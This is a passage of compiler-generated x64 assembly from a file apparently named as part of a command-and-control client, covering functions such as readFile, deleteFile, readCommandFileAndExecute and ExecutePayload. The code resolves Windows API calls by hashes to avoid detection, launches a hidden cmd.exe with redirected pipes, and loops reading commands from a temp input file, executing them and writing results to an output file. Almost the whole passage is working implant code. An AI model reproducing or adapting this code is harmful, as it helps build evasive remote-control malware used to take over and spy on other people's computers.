	mov	rcx, rbx
	call	rsi
; Line 475
	mov	rcx, rbx
	call	r14
$LN2@writeFile:
; Line 478
	mov	rbx, QWORD PTR [rsp+104]
	mov	rbp, QWORD PTR [rsp+112]
	add	rsp, 64					; 00000040H
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
writeFile ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT fileExists
_TEXT	SEGMENT
filePath$dead$ = 48
fileExists PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 480
$LN6:
	sub	rsp, 40					; 00000028H
; Line 483
	mov	ecx, 1526845075				; 5b01ce93H
	call	GetProcAddressWithHash
; Line 485
	lea	rcx, OFFSET FLAT:g_pathInputFile
	call	rax
; Line 486
	cmp	eax, -1					; ffffffffH
	je	SHORT $LN3@fileExists
	test	al, 16
	jne	SHORT $LN3@fileExists
	mov	al, 1
	jmp	SHORT $LN4@fileExists
$LN3@fileExists:
	xor	al, al
$LN4@fileExists:
; Line 487
	add	rsp, 40					; 00000028H
	ret	0
fileExists ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT readFile
_TEXT	SEGMENT
pNtClose$1$ = 64
message01$1 = 72
message$ = 88
pGetStdHandle$1$ = 192
filePath$dead$ = 192
written1$2 = 192
written$ = 200
bytesRead$ = 208
pReadFile$1$ = 216
readFile PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 489
$LN7:
	mov	QWORD PTR [rsp+8], rcx
	push	rbp
	push	rbx
	push	rsi
	push	rdi
	push	r12
	push	r13
	push	r14
	push	r15
	mov	rbp, rsp
	sub	rsp, 120				; 00000078H
; Line 492
	mov	ecx, 1339750106				; 4fdaf6daH
	call	GetProcAddressWithHash
; Line 495
	mov	ecx, 1881019078				; 701e12c6H
	mov	rbx, rax
	call	GetProcAddressWithHash
; Line 498
	mov	ecx, -1151361363			; bb5f9eadH
	mov	rdi, rax
	call	GetProcAddressWithHash
; Line 503
	mov	ecx, -1583809039			; a198fdf1H
	mov	QWORD PTR pReadFile$1$[rbp-120], rax
	call	GetProcAddressWithHash
; Line 506
	mov	ecx, 1418739419				; 54903edbH
	mov	QWORD PTR pNtClose$1$[rbp-120], rax
	call	GetProcAddressWithHash
; Line 509
	mov	ecx, -131836079				; f8245751H
	mov	r15, rax
	call	GetProcAddressWithHash
; Line 512
	mov	ecx, 1405795096				; 53cabb18H
	mov	r12, rax
	call	GetProcAddressWithHash
; Line 515
	mov	ecx, 1573608817				; 5dcb5d71H
	mov	QWORD PTR pGetStdHandle$1$[rbp-120], rax
	call	GetProcAddressWithHash
; Line 517
	and	QWORD PTR [rsp+48], 0
	lea	rcx, OFFSET FLAT:g_pathInputFile
	xor	r9d, r9d
	mov	DWORD PTR [rsp+40], 128			; 00000080H
	mov	edx, -2147483648			; 80000000H
	mov	DWORD PTR [rsp+32], 3
	mov	rsi, rax
	lea	r8d, QWORD PTR [r9+1]
	call	rbx
	mov	r14, rax
; Line 518
	cmp	rax, -1
	jne	SHORT $LN2@readFile
; Line 519
	xor	eax, eax
	jmp	$LN1@readFile
$LN2@readFile:
; Line 522
	xor	edx, edx
	mov	rcx, r14
	call	rdi
; Line 524
	mov	ecx, -11				; fffffff5H
	mov	r13d, eax
	call	QWORD PTR pGetStdHandle$1$[rbp-120]
; Line 525
	movdqa	xmm0, XMMWORD PTR __xmm@000a0d21646c726f57202c6f6c6c6548
; Line 527
	lea	r9, QWORD PTR written$[rbp-120]
	xor	ebx, ebx
	lea	rdx, QWORD PTR message$[rbp-120]
	mov	rcx, rax
	mov	QWORD PTR [rsp+32], rbx
	mov	rdi, rax
	movdqu	XMMWORD PTR message$[rbp-120], xmm0
	lea	r8d, QWORD PTR [rbx+15]
	call	rsi
; Line 529
	test	r12, r12
	je	SHORT $LN4@readFile
	test	r15, r15
	jne	SHORT $LN3@readFile
$LN4@readFile:
; Line 533
	lea	r9, QWORD PTR written1$2[rbp-120]
	mov	DWORD PTR message01$1[rbp-120], 1885431144 ; 70616568H
	mov	r8d, 11
	mov	DWORD PTR message01$1[rbp-116], 1768843552 ; 696e6920H
	lea	rdx, QWORD PTR message01$1[rbp-120]
	mov	DWORD PTR message01$1[rbp-112], 658804	; 000a0d74H
	mov	rcx, rdi
	mov	QWORD PTR [rsp+32], rbx
	call	rsi
$LN3@readFile:
; Line 537
	lea	ebx, DWORD PTR [r13+1]
	call	r12
	mov	rcx, rax
	mov	r8d, ebx
	xor	edx, edx
	call	r15
; Line 539
	xor	r15d, r15d
	lea	r9, QWORD PTR written$[rbp-120]
	lea	rdx, QWORD PTR message$[rbp-120]
	mov	QWORD PTR [rsp+32], r15
	mov	rcx, rdi
	mov	rbx, rax
	lea	r8d, QWORD PTR [r15+15]
	call	rsi
; Line 543
	lea	r9, QWORD PTR bytesRead$[rbp-120]
	mov	QWORD PTR [rsp+32], r15
	mov	r8d, r13d
	mov	rdx, rbx
	mov	rcx, r14
	call	QWORD PTR pReadFile$1$[rbp-120]
; Line 544
	mov	ecx, DWORD PTR bytesRead$[rbp-120]
	mov	BYTE PTR [rcx+rbx], r15b
; Line 549
	mov	rcx, r14
	call	QWORD PTR pNtClose$1$[rbp-120]
; Line 551
	mov	rax, rbx
$LN1@readFile:
; Line 552
	add	rsp, 120				; 00000078H
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rdi
	pop	rsi
	pop	rbx
	pop	rbp
	ret	0
readFile ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT deleteFile
_TEXT	SEGMENT
filePath$ = 48
deleteFile PROC						; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 554
$LN4:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx
; Line 557
	mov	ecx, 333262551				; 13dd2ed7H
	call	GetProcAddressWithHash
; Line 559
	mov	rcx, rbx
; Line 560
	add	rsp, 32					; 00000020H
	pop	rbx
; Line 559
	rex_jmp	rax
deleteFile ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT readCommandFileAndExecute
_TEXT	SEGMENT
pathInputFile$dead$ = 64
pathOutputFile$dead$ = 72
tempBuffer$1 = 72
readCommandFileAndExecute PROC				; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 562
$LN27:
	mov	rax, rsp
	mov	QWORD PTR [rax+8], rbx
	mov	QWORD PTR [rax+24], rbp
	mov	QWORD PTR [rax+32], rsi
	mov	QWORD PTR [rax+16], rdx
	push	rdi
	push	r14
	push	r15
	sub	rsp, 32					; 00000020H
; Line 565
	mov	ecx, -863108876				; cc8e00f4H
	call	GetProcAddressWithHash
; Line 568
	mov	ecx, -594710156				; dc8d7174H
	mov	rbx, rax
	call	GetProcAddressWithHash
; Line 571
	mov	ecx, -1017144077			; c35f9cf3H
	mov	r14, rax
	call	GetProcAddressWithHash
; Line 574
	mov	ecx, -131836079				; f8245751H
	mov	rsi, rax
	call	GetProcAddressWithHash
; Line 577
	mov	ecx, -533335996				; e035f044H
	mov	rbp, rax
	call	GetProcAddressWithHash
; Line 483
	mov	ecx, 1526845075				; 5b01ce93H
; Line 577
	mov	r15, rax
; Line 483
	call	GetProcAddressWithHash
; Line 485
	lea	rcx, OFFSET FLAT:g_pathInputFile
	call	rax
; Line 486
	cmp	eax, -1					; ffffffffH
	je	$LN2@readComman
	test	al, 16
	jne	$LN2@readComman
; Line 590
	call	readFile
	mov	rdi, rax
; Line 593
	test	rax, rax
	je	$LN2@readComman
; Line 595
	mov	rcx, rax
	call	rbx
; Line 596
	cmp	eax, 4
	jl	SHORT $LN5@readComman
; Line 597
	mov	eax, DWORD PTR [rdi]
; Line 600
	lea	rdx, OFFSET FLAT:??_C@_04MKNBDEPB@exit@
	lea	rcx, QWORD PTR tempBuffer$1[rsp]
	mov	DWORD PTR tempBuffer$1[rsp], eax
	mov	BYTE PTR tempBuffer$1[rsp+4], 0
	call	r14
	test	eax, eax
	jne	SHORT $LN5@readComman
; Line 601
	mov	rcx, rdi
	call	WriteToPipe
; Line 557
	mov	ebx, 333262551				; 13dd2ed7H
	mov	ecx, ebx
	call	GetProcAddressWithHash
; Line 559
	lea	rcx, OFFSET FLAT:g_pathInputFile
	call	rax
; Line 557
	mov	ecx, ebx
	call	GetProcAddressWithHash
; Line 559
	lea	rcx, OFFSET FLAT:g_pathOutputFile
	call	rax
; Line 604
	call	rbp
	mov	rcx, rax
	mov	r8, rdi
	xor	edx, edx
	call	rsi
; Line 605
	xor	al, al
	jmp	SHORT $LN1@readComman
$LN5@readComman:
; Line 609
	mov	rcx, rdi
	call	WriteToPipe
; Line 610
	mov	ecx, 2000				; 000007d0H
	call	r15
; Line 612
	call	ReadFromPipe
; Line 613
	mov	rdx, rax
	mov	rbx, rax
	call	writeFile
; Line 615
	call	rbp
	mov	rcx, rax
	mov	r8, rbx
	xor	edx, edx
	call	rsi
; Line 616
	call	rbp
	mov	rcx, rax
	mov	r8, rdi
	xor	edx, edx
	call	rsi
$LN2@readComman:
; Line 618
	mov	al, 1
$LN1@readComman:
; Line 619
	mov	rbx, QWORD PTR [rsp+64]
	mov	rbp, QWORD PTR [rsp+80]
	mov	rsi, QWORD PTR [rsp+88]
	add	rsp, 32					; 00000020H
	pop	r15
	pop	r14
	pop	rdi
	ret	0
readCommandFileAndExecute ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
;	COMDAT ExecutePayload
_TEXT	SEGMENT
sINPUT$1 = 80
sOUTPUT$2 = 96
piProcInfo$3 = 112
saAttr$4 = 112
siStartInfo$5 = 144
tempPath$6 = 256
sCMD$7 = 576
tempBuffer$8 = 576
ExecutePayload PROC					; COMDAT
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 623
$LN90:
	mov	rax, rsp
	mov	QWORD PTR [rax+16], rbx
	mov	QWORD PTR [rax+24], rsi
	mov	QWORD PTR [rax+32], rdi
	push	rbp
	push	r12
	push	r13
	push	r14
	push	r15
	lea	rbp, QWORD PTR [rax-312]
	sub	rsp, 528				; 00000210H
; Line 639
	mov	ecx, -533335996				; e035f044H
	call	GetProcAddressWithHash
; Line 641
	xor	r14d, r14d
; Line 419
	mov	ecx, -464915664				; e449f330H
; Line 641
	mov	QWORD PTR g_hChildStd_IN_Rd, r14
	mov	r13, rax
; Line 642
	mov	QWORD PTR g_hChildStd_IN_Wr, r14
; Line 643
	mov	QWORD PTR g_hChildStd_OUT_Rd, r14
; Line 644
	mov	QWORD PTR g_hChildStd_OUT_Wr, r14
; Line 419
	call	GetProcAddressWithHash
; Line 425
	lea	rdx, QWORD PTR tempPath$6[rbp-256]
	mov	DWORD PTR sINPUT$1[rsp], 1970302569	; 75706e69H
	mov	ecx, 260				; 00000104H
	mov	DWORD PTR sINPUT$1[rsp+4], 2020879988	; 78742e74H
	mov	dil, 105				; 00000069H
	mov	WORD PTR sINPUT$1[rsp+8], 116		; 00000074H
	mov	bl, 111					; 0000006fH
	mov	DWORD PTR sOUTPUT$2[rsp], 1886680431	; 7074756fH
	mov	DWORD PTR sOUTPUT$2[rsp+4], 1949201525	; 742e7475H
	mov	WORD PTR sOUTPUT$2[rsp+8], 29816	; 00007478H
	mov	BYTE PTR sOUTPUT$2[rsp+10], r14b
	call	rax
; Line 432
	mov	cl, BYTE PTR tempPath$6[rbp-256]
	lea	r9, OFFSET FLAT:g_pathInputFile
	lea	r15d, QWORD PTR [r14+1]
	mov	rax, r9
	test	cl, cl
	je	SHORT $LN27@ExecutePay
; Line 433
	lea	r8, QWORD PTR tempPath$6[rbp-256]
	mov	dl, cl
	sub	r8, r9
$LL26@ExecutePay:
	mov	BYTE PTR [rax], dl
	add	rax, r15
	mov	dl, BYTE PTR [r8+rax]
	test	dl, dl
	jne	SHORT $LL26@ExecutePay
$LN27@ExecutePay:
; Line 435
	lea	rdx, QWORD PTR sINPUT$1[rsp]
	sub	rdx, rax
$LL28@ExecutePay:
; Line 437
	mov	BYTE PTR [rax], dil
	add	rax, r15
	mov	dil, BYTE PTR [rdx+rax]
	test	dil, dil
	jne	SHORT $LL28@ExecutePay
; Line 439
	mov	BYTE PTR [rax], r14b
; Line 443
	lea	rdi, OFFSET FLAT:g_pathOutputFile
	mov	rax, rdi
; Line 444
	test	cl, cl
	je	SHORT $LN31@ExecutePay
; Line 445
	lea	rdx, QWORD PTR tempPath$6[rbp-256]
	sub	rdx, rdi
$LL30@ExecutePay:
	mov	BYTE PTR [rax], cl
	add	rax, r15
	mov	cl, BYTE PTR [rdx+rax]
	test	cl, cl
	jne	SHORT $LL30@ExecutePay
$LN31@ExecutePay:
; Line 447
	lea	rcx, QWORD PTR sOUTPUT$2[rsp]
	sub	rcx, rax
$LL32@ExecutePay:
; Line 449
	mov	BYTE PTR [rax], bl
	add	rax, r15
	mov	bl, BYTE PTR [rcx+rax]
	test	bl, bl
	jne	SHORT $LL32@ExecutePay
; Line 272
	mov	ecx, 246402878				; 0eafcf3eH
; Line 451
	mov	BYTE PTR [rax], r14b
; Line 272
	call	GetProcAddressWithHash
; Line 275
	mov	ecx, 483595210				; 1cd313caH
	mov	rbx, rax
	call	GetProcAddressWithHash
; Line 279
	mov	r12d, 24
; Line 280
	mov	DWORD PTR saAttr$4[rbp-240], r15d
; Line 284
	xor	r9d, r9d
	mov	DWORD PTR saAttr$4[rsp], r12d
	lea	r8, QWORD PTR saAttr$4[rsp]
	mov	QWORD PTR saAttr$4[rsp+8], r14
	lea	rdx, OFFSET FLAT:g_hChildStd_OUT_Wr
	mov	rdi, rax
	lea	rcx, OFFSET FLAT:g_hChildStd_OUT_Rd
	call	rbx
	test	eax, eax
	je	SHORT $LN39@ExecutePay
; Line 289
	mov	rcx, QWORD PTR g_hChildStd_OUT_Rd
	xor	r8d, r8d
	mov	edx, r15d
	call	rdi
	test	eax, eax
	je	SHORT $LN39@ExecutePay
; Line 294
	xor	r9d, r9d
	lea	r8, QWORD PTR saAttr$4[rsp]
	lea	rdx, OFFSET FLAT:g_hChildStd_IN_Wr
	lea	rcx, OFFSET FLAT:g_hChildStd_IN_Rd
	call	rbx
	test	eax, eax
	je	SHORT $LN39@ExecutePay
; Line 299
	mov	rcx, QWORD PTR g_hChildStd_IN_Wr
	xor	r8d, r8d
	mov	edx, r15d
	call	rdi
$LN39@ExecutePay:
; Line 229
	mov	ecx, -2042639239			; 863fcc79H
	call	GetProcAddressWithHash
; Line 232
	mov	ecx, -1583809039			; a198fdf1H
	mov	rbx, rax
	call	GetProcAddressWithHash
	mov	rsi, rax
; Line 248
	mov	DWORD PTR sCMD$7[rbp-256], 778333539	; 2e646d63H
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	xor	eax, eax
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 248
	mov	DWORD PTR sCMD$7[rbp-252], 6649957	; 00657865H
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	lea	rdi, QWORD PTR piProcInfo$3[rsp]
	mov	rcx, r12
	rep stosb
	lea	rdi, QWORD PTR siStartInfo$5[rbp-256]
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 250
	xor	r9d, r9d
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	lea	edx, QWORD PTR [rax+104]
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 250
	xor	r8d, r8d
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.22621.0\um\winnt.h
; Line 21740
	mov	ecx, edx
	rep stosb
; File C:\Users\omega_sayer\Documents\C2_Client\funWithShellcode\exec_hashed.c
; Line 242
	mov	rcx, QWORD PTR g_hChildStd_OUT_Wr
; Line 250
	lea	rax, QWORD PTR piProcInfo$3[rsp]
	or	DWORD PTR siStartInfo$5[rbp-196], 257	; 00000101H
	mov	QWORD PTR [rsp+72], rax
	lea	rax, QWORD PTR siStartInfo$5[rbp-256]
	mov	QWORD PTR [rsp+64], rax
	mov	QWORD PTR siStartInfo$5[rbp-160], rcx
	mov	QWORD PTR siStartInfo$5[rbp-168], rcx
	mov	rcx, QWORD PTR g_hChildStd_IN_Rd
	mov	QWORD PTR [rsp+56], r14
	mov	QWORD PTR [rsp+48], r14
	mov	DWORD PTR siStartInfo$5[rbp-256], edx
	lea	rdx, QWORD PTR sCMD$7[rbp-256]
	mov	QWORD PTR siStartInfo$5[rbp-176], rcx
	xor	ecx, ecx
	mov	DWORD PTR [rsp+40], 134217728		; 08000000H
	mov	DWORD PTR [rsp+32], r15d
	mov	WORD PTR siStartInfo$5[rbp-192], r14w
	call	rbx
; Line 261
	test	eax, eax
	je	SHORT $LL2@ExecutePay
; Line 264
	mov	rcx, QWORD PTR piProcInfo$3[rsp]
	call	rsi
; Line 265
	mov	rcx, QWORD PTR piProcInfo$3[rsp+8]
	call	rsi
$LL2@ExecutePay:
; Line 565
	mov	ecx, -863108876				; cc8e00f4H
	call	GetProcAddressWithHash
; Line 568
	mov	ecx, -594710156				; dc8d7174H
	mov	rdi, rax
	call	GetProcAddressWithHash
; Line 571
	mov	ecx, -1017144077			; c35f9cf3H
	mov	r15, rax
	call	GetProcAddressWithHash
; Line 574
	mov	ecx, -131836079				; f8245751H
	mov	rsi, rax
	call	GetProcAddressWithHash
; Line 577
	mov	ecx, -533335996				; e035f044H
	mov	r14, rax
	call	GetProcAddressWithHash
; Line 483
	mov	ecx, 1526845075				; 5b01ce93H
; Line 577
	mov	r12, rax
; Line 483
	call	GetProcAddressWithHash
; Line 485
	lea	rcx, OFFSET FLAT:g_pathInputFile
	call	rax
; Line 486
	cmp	eax, -1					; ffffffffH
	je	SHORT $LN7@ExecutePay
	test	al, 16
	jne	SHORT $LN7@ExecutePay
; Line 590
	call	readFile
	mov	rbx, rax
; Line 593
	test	rax, rax
	je	SHORT $LN7@ExecutePay
; Line 595
	mov	rcx, rax
	call	rdi
; Line 596
	cmp	eax, 4
	jl	SHORT $LN10@ExecutePay
; Line 597
	mov	eax, DWORD PTR [rbx]
; Line 600
	lea	rdx, OFFSET FLAT:??_C@_04MKNBDEPB@exit@
	lea	rcx, QWORD PTR tempBuffer$8[rbp-256]
	mov	DWORD PTR tempBuffer$8[rbp-256], eax
	mov	BYTE PTR tempBuffer$8[rbp-252], 0
	call	r15
	test	eax, eax
	je	SHORT $LN81@ExecutePay
$LN10@ExecutePay:
; Line 609
	mov	rcx, rbx
	call	WriteToPipe
; Line 610
	mov	ecx, 2000				; 000007d0H
	call	r12
; Line 612
	call	ReadFromPipe
; Line 613
	mov	rdx, rax
	mov	rdi, rax
	call	writeFile
; Line 615
	call	r14
	mov	rcx, rax
	mov	r8, rdi
	xor	edx, edx
	call	rsi
; Line 616
	call	r14
	mov	rcx, rax
	mov	r8, rbx
	xor	edx, edx
	call	rsi
$LN7@ExecutePay:
; Line 667
	mov	ecx, 6000				; 00001770H
	call	r13
; Line 668
	jmp	$LL2@ExecutePay
$LN81@ExecutePay:
; Line 601
	mov	rcx, rbx
	call	WriteToPipe
; Line 557
	mov	edi, 333262551				; 13dd2ed7H
	mov	ecx, edi
	call	GetProcAddressWithHash
; Line 559
	lea	rcx, OFFSET FLAT:g_pathInputFile
	call	rax
; Line 557
	mov	ecx, edi
	call	GetProcAddressWithHash
; Line 559
	lea	rcx, OFFSET FLAT:g_pathOutputFile
	call	rax
; Line 604
	call	r14
	mov	rcx, rax
	mov	r8, rbx
	xor	edx, edx
	call	rsi
; Line 674
	lea	r11, QWORD PTR [rsp+528]
	mov	rbx, QWORD PTR [r11+56]
	mov	rsi, QWORD PTR [r11+64]
	mov	rdi, QWORD PTR [r11+72]
	mov	rsp, r11
	pop	r15
	pop	r14
	pop	r13
	pop	r12
	pop	rbp
	ret	0
ExecutePayload ENDP
_TEXT	ENDS
END
